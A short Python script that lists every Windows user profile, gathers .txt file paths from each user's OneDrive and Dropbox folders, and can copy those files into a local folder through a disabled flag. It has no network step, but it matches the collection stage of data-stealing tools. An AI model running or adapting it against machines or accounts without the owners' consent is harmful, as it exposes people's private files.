import os
import glob
import shutil

try:
    os.mkdir('copied_files')
except:
    pass

copy = False

users = [name for name in os.listdir('C:\\Users\\') 
          if os.path.isdir(os.path.join('C:\\Users\\', name))]

print(users)

data_types = ['txt']
all_files = []

for user in users:
    base_path = os.path.join('C:\\Users', user)

    onedrive_path = os.path.join(base_path, 'OneDrive')
    if os.path.isdir(onedrive_path):
        for type in data_types:
            files = glob.glob(f'**/*.{type}', root_dir=onedrive_path, recursive=True)
            all_files.extend([os.path.join(onedrive_path, file) for file in files])

    dropbox_roots = glob.glob(os.path.join(base_path, 'Dropbox*'))
    for dropbox_path in dropbox_roots:
        if os.path.isdir(dropbox_path):
            for type in data_types:
                files = glob.glob(f'**/*.{type}', root_dir=dropbox_path, recursive=True)
                all_files.extend([os.path.join(dropbox_path, f) for f in files])

print(all_files)

if copy:
    for file in all_files:
        shutil.copy(file, r'.\copied_files')

